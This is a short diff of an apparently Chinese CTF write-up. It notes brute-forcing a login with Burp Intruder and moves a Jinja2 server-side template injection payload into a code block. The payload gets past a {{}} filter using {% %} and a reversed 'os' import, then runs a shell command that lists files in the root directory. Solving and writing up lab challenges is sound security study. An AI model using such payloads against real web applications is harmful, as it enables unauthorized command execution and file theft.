@@ -24,10 +24,11 @@ username 和 password 错误时输出不同。burp 起一个 intruder 爆。
 
 {% raw %}
 过滤了{{}}那用{%%}。别的正常 SSTI 就行。
-
-`{%print(g.pop.__globals__.__builtins__.__import__('so'[::-1]).popen('nl ``/*``').read())%}`
-
 {% endraw %}
+
+```
+{%print(g.pop.__globals__.__builtins__.__import__('so'[::-1]).popen('nl ``/*``').read())%}
+```
 
 ## 多重宇宙日记
 
